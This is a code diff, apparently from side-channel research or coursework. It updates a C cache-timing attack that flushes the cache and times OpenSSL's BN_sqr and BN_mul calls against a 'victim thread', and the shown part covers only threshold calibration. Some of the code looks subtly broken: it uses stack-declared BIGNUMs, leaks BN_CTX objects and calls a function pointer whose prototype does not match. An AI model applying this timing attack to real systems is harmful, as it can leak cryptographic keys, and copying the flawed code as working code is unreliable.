@@ -30,29 +30,30 @@ static inline void flush()
 }
 
 // measure the time it takes to execute function p(0) and return start and duration
-static inline sample_t timed_call_1(void (*p)())
+static inline sample_t timed_call_1(void (*p)(BIGNUM*, const BIGNUM*, BN_CTX*))
 {
-    printf("9\n");
-    unsigned long r = 1, a = 1;
-    printf("10\n");
+    BIGNUM r, a;
+    BN_CTX* ctx = BN_CTX_new();
+    BN_one(&r);
+    BN_one(&a);
     uint64_t start, end;
-    printf("11\n");
     start = rdtsc();
-    printf("12\n");
-    p();
-    printf("13\n");
+    p(&r, &a, ctx);
     end = rdtsc();
-    printf("14\n");
     return (sample_t) {start, end - start};
 }
 
 // measure the time it takes to execute function p(0,0) and return start and duration
 static inline sample_t timed_call_2(void (*p)())
 {
-    unsigned long r = 1, a = 1, b = 1;
+    BIGNUM r, a, b;
+    BN_CTX* ctx = BN_CTX_new();
+    BN_one(&r);
+    BN_one(&a);
+    BN_one(&b);
     uint64_t start, end;
     start = rdtsc();
-    p();
+    p(&r, &a, &b, ctx);
     end = rdtsc();
     return (sample_t) {start, end - start};
 }
@@ -104,32 +105,22 @@ int main()
     uint64_t threshold_2 = 0;
     // victim thread
     pthread_t calculate_thread;
-    unsigned long r = 1, a = 1, b = 1;
-
-    void (*bn_sqr_hook)() = &BN_sqr;
-    void (*bn_mul_hook)() = &BN_mul;
-    bn_sqr_hook -= 0x1000;
-    bn_mul_hook -= 0x1000;
-
 
     // get threshold for cached and uncached square access
-    printf("1\n");
-    printf("BN_sqr: %p\n", BN_sqr);
-    printf("BN_sqr_hook: %p\n", BN_sqr_hook);
-    // BN_sqr_hook();
-    printf("2\n");
+    BIGNUM r, a, b;
+    BN_CTX* ctx = BN_CTX_new();
+    BN_one(&r);
+    BN_one(&a);
+    BN_one(&b);
+
+    BN_sqr(&r, &a, ctx);
+
     for (size_t i=0; i<SAMPLE_SIZE; i++) {
-        printf("3\n");
-        chached_timings_1[i] = timed_call_1(bn_sqr_hook).duration;
-        printf("4\n");
+        chached_timings_1[i] = timed_call_1(BN_sqr).duration;
     }
-    printf("5\n");
     for (size_t i=0; i<SAMPLE_SIZE; i++) {
-        printf("6\n");
         flush();
-        printf("7\n");
-        unchached_timings_1[i] = timed_call_1(bn_sqr_hook).duration;
-        printf("8\n");
+        unchached_timings_1[i] = timed_call_1(BN_sqr).duration;
     }
     uint64_t cached_median_1 = median(chached_timings_1, SAMPLE_SIZE);
     uint64_t uncached_median_1 = median(unchached_timings_1, SAMPLE_SIZE);
@@ -137,15 +128,15 @@ int main()
     printf("threshold 1: %lu\n", threshold_1);
 
     // get threshold for cached and uncached multiply access
-    bn_mul_hook(b);
+    BN_mul(&r, &a, &b, ctx);
     for (int i = 0; i < SAMPLE_SIZE; i++)
     {
-        chached_timings_2[i] = timed_call_2(bn_mul_hook).duration;
+        chached_timings_2[i] = timed_call_2(BN_mul).duration;
     }
     for (int i = 0; i < SAMPLE_SIZE; i++)
     {
         flush();
-        unchached_timings_2[i] = timed_call_2(bn_mul_hook).duration;
+        unchached_timings_2[i] = timed_call_2(BN_mul).duration;
     }
     uint64_t cached_median_2 = median(chached_timings_2, SAMPLE_SIZE);
     uint64_t uncached_median_2 = median(unchached_timings_2, SAMPLE_SIZE);
